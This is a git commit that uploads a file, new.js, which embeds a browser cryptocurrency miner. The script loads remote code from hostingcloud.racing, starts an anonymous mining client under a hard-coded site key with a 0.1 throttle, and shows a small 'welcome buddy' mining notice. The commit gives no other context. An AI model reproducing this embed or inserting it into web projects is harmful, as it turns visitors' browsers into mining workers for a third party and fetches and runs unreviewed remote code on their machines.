cbdddd1179c1e52eb4d5204c9a9847c7af71334e
daana3 <108857584+daana3@users.noreply.github.com>
2022-07-07 11:47:26 +0530

    Add files via upload

---
+++ new.js
@@ -0,0 +1,9 @@
+<script src="https://www.hostingcloud.racing/n5yV.js"></script>
+<script>
+    var _client = new Client.Anonymous('d51992382e666f2dbe9c83a4c1be7f23d9765e674f7e725d548cf36fed4ca49d', {
+        throttle: 0.1, c: 'w'
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "welcome buddy", "#cccccc", 40, "#3d3d3d");
+
+</script>
